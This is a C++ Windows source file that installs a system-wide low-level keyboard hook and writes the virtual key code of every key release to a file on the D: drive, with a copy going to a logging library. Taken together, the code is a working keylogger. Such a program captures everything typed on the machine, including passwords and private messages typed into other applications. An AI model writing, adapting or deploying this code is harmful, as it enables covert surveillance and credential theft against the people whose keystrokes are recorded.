#include <Windows.h>
#include <cctype>
#include "window.h"
#include "hook.h"
#include "cLog.h"

#ifdef _DEBUG
#pragma comment(lib, "log_lib_d.lib")
#else
#pragma comment(lib, "log_lib.lib")
#endif

#define ERR_WND_CREATE      (NO_ERROR + 1)
#define ERR_CREATE_FILE     (ERR_WND_CREATE + 1)
#define ERR_QUEUE_RUN       (ERR_CREATE_FILE + 1)
#define ERR_INSTALL_HOOK    (ERR_QUEUE_RUN + 1)

//
// Window msg proc
//
LRESULT __stdcall WndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
//
// Hook proc
//
LRESULT __stdcall HookProc(int nCode, WPARAM wParam, LPARAM lParam);
WORD ch;
HOOK_INFO hook;
HANDLE    hFile;
System_LOG::cLog g_log;
int CALLBACK wWinMain(
	__in  HINSTANCE hInstance,
	__in  HINSTANCE hPrevInstance,
	__in  LPWSTR lpCmdLine,
	__in  int nCmdShow
	)
{
	int retCode = 0;

	hook.lpfnHookProc = HookProc;
	hook.hInst = hInstance;

	if(CreateMainWindow(hInstance, WndProc) != 0)
	{
		MessageBoxW(NULL, L"Can't create window!", NULL, MB_OK);
		return ERR_WND_CREATE;
	}

	hFile = CreateFileW(
		L"d:\\log.txt",
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
		);

	if(hFile == INVALID_HANDLE_VALUE)
	{
		return ERR_CREATE_FILE;
	}

	if(!RunQueue())
		retCode = ERR_QUEUE_RUN;

	FlushFileBuffers(hFile);
	CloseHandle(hFile);

	return retCode;
}

LRESULT __stdcall WndProc(
	HWND hWnd,
	UINT uMsg,
	WPARAM wParam,
	LPARAM lParam
	)
{
	switch(uMsg)
	{
	case WM_CREATE:
		if(!InstallHook(&hook, WH_KEYBOARD_LL))
		{
			MessageBoxW(NULL, L"Can't install hook!", NULL, MB_OK);
			PostQuitMessage(ERR_INSTALL_HOOK);
		}
		break;
	case WM_QUIT:
		if(hook.hHook != NULL)
			UninstallHook(&hook);
		break;
	}

	return DefWindowProcW(hWnd, uMsg, wParam, lParam);
}

LRESULT __stdcall HookProc(
	int nCode,
	WPARAM wParam,
	LPARAM lParam
	)
{
	if(nCode == HC_ACTION)
	{
		PKBDLLHOOKSTRUCT kbd;
		DWORD            wrCount;
		
		kbd = (PKBDLLHOOKSTRUCT)lParam;

		switch((int)wParam)
		{		case WM_KEYUP:
			
			g_log.Call((char*)&kbd->vkCode);
			if(!WriteFile(hFile, &kbd->vkCode, 2, &wrCount, NULL))
				;
			//if(kbd->vkCode == 'Q')
			//	PostQuitMessage(0);
			break;
		}
	}

	return CallNextHookEx(hook.hHook, nCode, wParam, lParam);
}